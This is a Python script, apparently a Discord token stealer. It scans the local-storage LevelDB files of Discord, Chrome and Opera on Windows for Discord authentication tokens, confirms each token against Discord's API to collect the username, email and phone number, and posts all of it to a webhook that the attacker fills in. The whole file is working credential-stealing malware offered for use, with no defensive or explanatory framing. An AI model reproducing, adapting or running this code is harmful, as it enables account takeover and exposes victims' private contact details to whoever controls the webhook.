import os
import re
import requests
import json
webhook = '' #Your Webhook goes here
potentialTokens = []
discDir = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'
chromeDir = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
operaDir = os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb'



embed = {
  "embeds": [
    {
      "title": 'a',
      "color": 7506394,
      "fields": [
        {
          "name": "Email",
          "value": 'a'
        },
        {
          "name": "Token",
          "value": 'a'
        },
        {
          "name": "Phone",
          "value": 'a'
        }
      ],
      "thumbnail": {
        "url": "https://cdn.discordapp.com/avatars/68496561913856/41bf246f93e8222d0eb8d59d8c.png"
      }
    }
  ]
}

def change_key(d, required_key, new_value): #This function is used to update the above embed
    for k, v in d.items():
        if isinstance(v, dict):
            change_key(v, required_key, new_value)
        if k == required_key:
            d[k] = new_value

def tokenCheck(token):
   r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
   if (r.status_code == 200):
       data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
       change_key(embed['embeds'][0], 'title', f"{data['username']}#{data['discriminator']}")
       change_key(embed['embeds'][0]['fields'][0], 'value', data['email'])
       change_key(embed['embeds'][0]['fields'][1], 'value', token)
       change_key(embed['embeds'][0]['fields'][2], 'value', data['phone'])
       change_key(embed['embeds'][0]['thumbnail'], 'url', f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png")
       requests.post(webhook, data=json.dumps(embed), headers={"Content-Type": "application/json"})

def discSearch():
    for file in os.listdir(discDir):
        try:
            file = open(discDir+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                tokenCheck(token)
        except Exception as e:
            print(e)
            pass

def chromeSearch():
    for file in os.listdir(chromeDir):
        try:
            file = open(chromeDir+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                tokenCheck(token)
        except Exception as e:
            print(e)
            pass

def operaSearch():
    for file in os.listdir(operaDir):
        try:
            file = open(operaDir+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                tokenCheck(token)
        except Exception as e:
            print(e)
            pass


try:
    discSearch()
except Exception as e:
    print(e)

try:
    chromeSearch()
except Exception as e:
    print(e)

try:
    operaSearch()
except Exception as e:
    print(e)
